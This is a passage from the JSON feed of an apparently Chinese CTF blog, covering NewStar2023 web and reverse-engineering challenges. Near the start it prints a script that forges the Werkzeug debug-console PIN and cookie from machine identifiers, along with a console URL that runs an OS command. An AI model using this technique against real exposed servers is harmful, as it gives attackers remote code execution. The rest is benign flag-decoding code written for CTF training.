class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>did<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>private_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">'108034640481895'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># /sys/class/net/eth0/address 16 进制转 10 进制</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\"># machine_id 由三个合并 (docker 就后两个)：1. /etc/machine-id   2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    bid <span class=\"token operator\">+</span> did  <span class=\"token comment\"># /proc/sys/kernel/random/boot_id</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>h <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> chain<span class=\"token punctuation\">(</span>probably_public_bits<span class=\"token punctuation\">,</span> private_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> bit<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        bit <span class=\"token operator\">=</span> bit<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b'cookiesalt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>cookie_name <span class=\"token operator\">=</span> <span class=\"token string\">'__wzd'</span> <span class=\"token operator\">+</span> h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">if</span> num <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b'pinsalt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    num <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'%09d'</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>rv <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">if</span> rv <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">for</span> group_size <span class=\"token keyword\">in</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            rv <span class=\"token operator\">=</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">:</span>x <span class=\"token operator\">+</span> group_size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span>group_size<span class=\"token punctuation\">,</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        rv <span class=\"token operator\">=</span> num</pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hash_pin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pin<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> added salt\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"replace\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cookie_name <span class=\"token operator\">+</span> <span class=\"token string\">\"=\"</span> <span class=\"token operator\">+</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">|</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hash_pin<span class=\"token punctuation\">(</span>rv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># 890KUjqCgmGiRRNLpH8a # http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__(\"os\").popen(\"ps\").read()&amp;frm=0&amp;s=890KUjqCgmGiRRNLpH8a</span></pre></td></tr></table></figure><h3 id=\"nextdrive\"><a class=\"anchor\" href=\"#nextdrive\">#</a> NextDrive</h3>\n<blockquote>\n<p>不限速，就是快！</p>\n<p>Hint1: flag 在环境变量中</p>\n<p>Hint2: 你知道秒传的原理吗？</p>\n</blockquote>\n",
            "tags": [
                "CTF",
                "无敌的Web",
                "php是世界上最好的语言",
                "我就是歪脖",
                "这次不坐牢了",
                "NewStar2023"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/reverse/NewStar2023week1/",
            "url": "https://p1kap1.github.io/CTF/reverse/NewStar2023week1/",
            "title": "NewStar2023week1-reverse",
            "date_published": "2023-09-30T16:00:00.000Z",
            "content_html": "<h2 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> Reverse</h2>\n<h3 id=\"easy_re\"><a class=\"anchor\" href=\"#easy_re\">#</a> easy_RE</h3>\n<p>打开 IDA 即可看到前半段 flag，F5 反汇编或者 tap 后，看到后半段 flag:</p>\n<p><img data-src=\"../../../images/NewStar/7.png\" alt=\"7\" height=\"600px\" width=\"600px\" /></p>\n<p><img data-src=\"../../../images/NewStar/8.png\" alt=\"8\" /></p>\n<h3 id=\"elf\"><a class=\"anchor\" href=\"#elf\">#</a> ELF</h3>\n<p>进入主函数，发现 flag 先进入了 encode 函数进行加密，然后再进行 base64 加密。</p>\n<pre><code class=\"language-C\">int __cdecl main(int argc, const char **argv, const char **envp)\n&#123;\n  unsigned int v3; // edx\n  char *s1; // [rsp+0h] [rbp-20h]\n  char *v6; // [rsp+8h] [rbp-18h]\n  char *s; // [rsp+10h] [rbp-10h]\n\n  s = (char *)malloc(0x64uLL);\n  printf(&quot;Input flag: &quot;);\n  fgets(s, 100, stdin);\n  s[strcspn(s, &quot;\\n&quot;)] = 0;\n  v6 = encode(s);\n  v3 = strlen(v6);\n  s1 = (char *)base64_encode(v6, v3);\n  if ( !strcmp(s1, &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;) )\n    puts(&quot;Correct&quot;);\n  else\n    puts(&quot;Wrong&quot;);\n  free(v6);\n  free(s1);\n  free(s);\n  return 0;\n&#125;\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>_BYTE <span class=\"token operator\">*</span>__fastcall <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token class-name\">size_t</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  _BYTE <span class=\"token operator\">*</span>v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-20h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+2Ch] [rbp-14h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> v1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    v2 <span class=\"token operator\">=</span> v6<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    v4<span class=\"token punctuation\">[</span>v2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  v4<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">return</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>了解加密逻辑，编写 EXP</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a<span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> string<span class=\"token punctuation\">.</span>printable<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> i<span class=\"token operator\">-</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            s <span class=\"token operator\">+=</span> j</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezpe\"><a class=\"anchor\" href=\"#ezpe\">#</a> EzPE</h3>\n<p>先修复 MZ 头，将 WZ 改为 MZ，然后再去修复 E_lfanew 的偏移，根据 PE 头的偏移，可以推断是其值为 0x80。</p>\n<p>关于 PE 头，可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYnJ1Y2UxOTkyL3AvMTcxNzk2MDUuaHRtbA==\">PE 文件逆向基础知识</span></p>\n<p><img data-src=\"../../../images/NewStar/9.png\" alt=\"9\" /></p>\n<p>异或算法，编写 EXP</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 逆向异或操作</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span><span class=\"token operator\">=</span> i <span class=\"token operator\">^</span> data<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 打印结果</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"lazy_activity\"><a class=\"anchor\" href=\"#lazy_activity\">#</a> Lazy_Activity</h3>\n<p>反编译后找到 flagactivty, 阅读代码，可以看到 flag 是</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>editText<span class=\"token punctuation\">.</span><span class=\"token function\">getText</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>final EditText editText <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>EditText<span class=\"token punctuation\">)</span> <span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>editTextTextPersonName2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>全局搜索 editTextTextPersonName2 即可</p>\n<p><img data-src=\"../../../images/NewStar/10.png\" alt=\"10\" /></p>\n<p>或者还有一种方法是结合模拟器来运行 FLag 类，而获得 Flag 的条件就是点击 10000 次，具体可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmd1aS5jYy9hcnRpY2xlL3Nob3ctNTcwNTEzLmh0bWw/YWN0aW9uPW9uQ2xpY2s=\">艾克体悟题</span></p>\n<p>在 jeb 的设置里开启 ADB 调试，启动指定的 Activity:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>adb shell am start <span class=\"token parameter variable\">-n</span> com.yusuzhan.xxx/.MainActivity</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>adb shell   进入shell</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">su</span>  获得root权限</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>启动指定控件，对应上图的路径</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>am start <span class=\"token parameter variable\">-n</span> com.droidlearn.activity_travel/.FlagActivity</pre></td></tr></table></figure><p>启动成功模拟器就会弹出，点击 10000 次得 flag:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> pyautogui <span class=\"token keyword\">as</span> pd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 创建一个标志变量，用于控制程序是否继续运行</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>running <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 创建一个函数，用于运行点击操作的线程</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">click_thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">global</span> running</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        pd<span class=\"token punctuation\">.</span>click<span class=\"token punctuation\">(</span>clicks<span class=\"token operator\">=</span><span class=\"token number\">10000</span><span class=\"token punctuation\">,</span> interval<span class=\"token operator\">=</span><span class=\"token number\">0.0001</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"An error occurred: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\"># 点击操作完成后，将标志变量设置为 False，通知主线程终止程序</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        running <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 创建一个新的线程来运行点击操作</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>click_thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>click_thread<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>click_thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 主线程等待 10 秒后终止程序</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>running <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>  <span class=\"token comment\"># 设置标志变量为 False 以终止点击操作线程</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 等待点击操作线程结束</span></pre></td></tr><tr><td 